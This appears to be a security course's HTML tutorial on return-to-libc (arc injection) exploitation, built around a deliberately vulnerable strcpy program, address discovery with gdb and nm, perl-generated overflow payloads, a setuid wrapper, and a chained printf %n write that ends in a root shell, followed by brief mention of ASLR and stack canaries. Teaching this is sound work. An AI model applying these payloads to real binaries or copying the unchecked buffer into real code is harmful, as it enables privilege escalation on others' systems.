<html>
<head>
<title>Arc injection / Return to Libc</title>
<style type="text/css">
code {color:purple}
</style>
</head>
<body>

<h1>Arc injection / Return to libc</h1>

<b>Why?</b>
    <ul>
    <li>Stack overflows require an executable stack, and securer
    systems can use a non-executable stack. <br>We need to get around
    this...</li> <br><br>
    <li>Also, if the buffer isn't big enough for shell code, this provides a
    different opportunity.</li>
    </ul>

<b>Requirements</b>
    <ul>
    <li><font color="#6600CC">Libc</font>: standard C library that contains
    useful functions such as <code>printf()</code>, <code>execl()</code>, and
    <code>system()</code>.</li>
    <br><br>
    <li>Vulnerable program, for example:

<pre><font color="#CC3399">vuln.c</font>
int main(int argc, char *argv[])
{
    char buffer[5];
    <font color="#0066FF">strcpy(buffer, argv[1]);</font>
    return 0;
}</pre>

    </li>
    </ul>

<b><code>system()</code> fun: finding memory addresses</b>
    <ul>
    <li><code>system()</code> takes a single argument and executes that
    argument with <code>/bin/sh</code>.<br>In this case, we want to do
    <code>system("/bin/sh")</code> to get a shell.<br><br>
    </li>
    <li>To use <code>system()</code>, we need to know where it is!  Two
    methods:
        <ul>
        <li><code>ldd</code> and <code>nm</code>:

<pre><font color="#990000">$ ldd vuln</font> 
        linux-gate.so.1 =&gt;  (0x00922000)
        <font color="#0066FF">libc.so.6 =&gt; /lib/libc.so.6 (0x00664000)</font>
        /lib/ld-linux.so.2 (0x00646000)
<font color="#990000">$ nm /lib/libc.so.6 | grep system</font>
00698e88 t do_system
0069932b T __libc_system
00751442 T svcerr_systemerr
<font color="#0066FF">0069932b W system</font></pre>
        
        </li>
        <li><code>gdb</code>:
        
<pre><font color="#990000">$ gdb -q vuln</font>
<font color="#990000">(gdb) break main</font>
Breakpoint 1 at 0x804838a
<font color="#990000">(gdb) run</font>
Starting program:
./vuln

Breakpoint 1, 0x0804838a in main ()
<font color="#990000">(gdb) p system</font>
$1 = {&lt;text variable, no debug info&gt;} <font
color="#0066FF">0x0069932b</font> &lt;system&gt; <font color="#0066FF">&lt;-- This is what we need!</font></pre>

        </li>
        </ul>
    </li>
    <li>We need to supply arguments in the proper order:<br><br>
        <table border=1 cellpadding=3>
        <tr align="center">
            <td width="20%">Function Address</td>
            <td width="20%">Return Address</td>
            <td width="20%">Argument 1</td>
            <td width="20%">...</td>
            <td width="20%">Argument <i>n</i></td>
        </tr>
        </table><br>
        In this case:
        <ul>
        <li><font color="#6600CC">Function Address</font>: System address we
        just found.</li>
        <li><font color="#6600CC">Return Address</font>: Doesn't matter.
        <li><font color="#6600CC">Argument</font>: Pointer to /bin/sh - store
        this in an environment variable.<br>
<pre><font color="#990000">$ export BINSH="/bin/sh"</font>
<font color="#990000">$ ./genv BINSH</font>
BINSH is located at <font color="#0066FF">0xbfffff47</font></pre>
        </li>
        </ul>
    </li>
    </ul>

<b>Exploit!</b>
    <ul>
    <li>Now we have the addresses of everything we need:
        <ul> <li><code>system()</code>: 0x0069932b</li>
        <li><code>BINSH</code>: 0xbfffff47</li> </ul>
    </li><br><br>
    <li>Crafting the buffer:
        <ol>
        <li><font color="#CC0099">Space before return address:</font> We're
        just calling system, so we can fill this with garbage.</li>
        <li><font color="#006699">Vuln's return address:</font> Overwritten
        with the address of <code>system()</code>.</li>
        <li><font color="#CC9900">System() return address:</font> Address that
        <code>system()</code> will return to.  Right now, we don't care.</li>
        <li><font color="#009966">System() function argument:</font>
        Address of <code>BINSH</code>.</li>
        </ol>
    </li><br><br>
    <li>Let perl help us out...
<pre>$ ./vuln `perl -e 'print <font color="#CC0099">"ABCD"x7</font> . "<font
color="#006699">\x2b\x93\x69\x00</font><font color="#CC9900">FAKE</font><font
color="#009966">\x47\xff\xff\xbf</font>";'`</pre>
    
    Note that the addresses are in reverse order thanks to little endian
    architecture.
    </li>
    </ul>

<b>Success!  ...but wait...</b>
    <ul>
    <li><code>system()</code> executes its arguments in <code>/bin/sh</code>,
    which drops privileges.  This means no root shell for us.</li><br><br>
    <li>How can we avoid this?  <code>execl(path, argv[0],
    argv[1]...)</code> will allow us to execute a convenient wrapper program
    such as:

<pre><font color="#CC3399">wrapper.c</font>
int main()
{
    setuid(0);
    setgid(0);
    system("/bin/sh");
}</pre>

    </li>
    <li>Our call: <code>execl("./wrapper", "./wrapper", 0)</code> should end
    up looking like:<br><br>
        <table border=1 cellpadding=3>
        <tr align="center">
            <td width="20%"><code>execl</code> address</td>
            <td width="20%">some return address</td>
            <td width="20%">"/pathto/wrapper"</td>
            <td width="20%">"/pathto/wrapper"</td>
            <td width="20%">0</td>
        </tr>
        </table><br>
    
    </li>
    </ul>

<b>And another complication...</b>
    <ul>
    <li>Slight issue: <code>execl()</code> requires an argument list that is
    null terminated.<br><br>This is a problem, because it will end our string
    early... so we need to chain multiple calls to <code>libc</code>.</li>
    <br><br>
    <li>Another useful function: <code>printf()</code>.  
        <ul>
        <li>The <code>%n</code> parameter prints how many characters have been
        written so far to a location specified by the argument.</li>
        <li>By using <code>n$</code> inside a parameter, you can
        read the value of the nth argument.</li>
        <li>Combining these, <code>%3$n</code> will write the number of
        characters printed so far to the address specified in the 3rd
        argument.</li>
        <li>There will be more details in the Format Strings talk.</li>
        </ul>
    </li>
    <br><br>
    <li>As before, we'll use environment variables to store argument strings:
        <ul>
        <li><code>WRAPPER</code>: "/pathto/wrapper"
        <li><code>FMTSTR</code>: "%3$n"
        </ul>
        We can find the location of these variables just like before.
    </li><br><br>
    <li>So what we need is this:<br><br>
        <table border=1 cellpadding=3>
        <tr align="center">
            <td width="16%"><code>printf()</code> address</td>
            <td width="16%"><code>execl()</code> address</td>
            <td width="16%"><code>FMTSTR</code> address</td>
            <td width="16%"><code>WRAPPER</code> address</td>
            <td width="16%"><code>WRAPPER</code> address</td>
            <td width="16%">address of this word</td>
        </tr>
        </table><br>
    
    </li>All that's left is to find the address of the last word - the address
    where we want to write NULL. 
    </ul>

<b>Finding an argument address</b>

    <ul>
    <li>We can just add debugging output to the vulnerable program's source
    code and recompile:

<pre><font color="#CC3399">vul2.c</font>
int main (int argc, char *argv[])
{
    char buffer[5];
    <font color="#0066FF">printf("buffer is at %p\n", buffer);</font>
    strcpy(buffer, argv[1]);
    return 0;
}</pre>
    
    </li>
    <li>To get an accurate address, we need to simulate the actual buffer size:

<pre><font color="#990000">$ ./vul2 `perl -e 'print "ABCD"x13;'`</font>
buffer is at 0xbffff550</pre>

    </li>
    <li>Now we need to add to the buffer address to find the specific
    argument we're looking for.<br><br>
    (7 long words of garbage + 5 argument long words) * 4 bytes in a long 
    = 48 bytes
<pre>0xbffff550 + 48 = 0xbffff580</pre>

    </li>
    </ul>

<b>Go! Go! Go!</b>

    <ul>
    <li>We now have everything we need to exploit!
        <ul>
        <li><code>printf()</code>: 0x40083960</li>
        <li><code>excel()</code>: 0x400dc140</li>
        <li><code>FMTSTR</code>: 0xbffffedf</li>
        <li><code>WRAPPER</code>: 0xbffffc65</li>
        <li>Null argument: 0xbffff580</li>
        </ul>
    </li><br><br>
    <li> Our final exploit:
<pre>$ ./vuln `perl -e 'print "ABCD"x7 . "\x60\x39\x08\x40" .
"\x40\xc1\x0d\x40" . "\xdf\xfe\xff\xbf" . "\x65\xfc\xff\xbf" .
"\x65\xfc\xff\xbf" . "\x80\xf5\xff\xbf";'`
<font color="#990000">sh-2.05a# id
uid=0(root) gid=0(root) groups=500(matrix)</font></pre>
    </li>
    </ul>

<b>Fixing the break - how can we prevent this?</b>

    <ul>
    <li><font color="#6600CC">Randomized address space</font>: If you don't
    know where things will be in memory, then you can't call them.</li>
    <br><br>
    <li><font color="#6600CC">Stack canary</font>: This will prevent you from
    overwriting the return address of a function.</li>
    </ul>

</body>
</html>
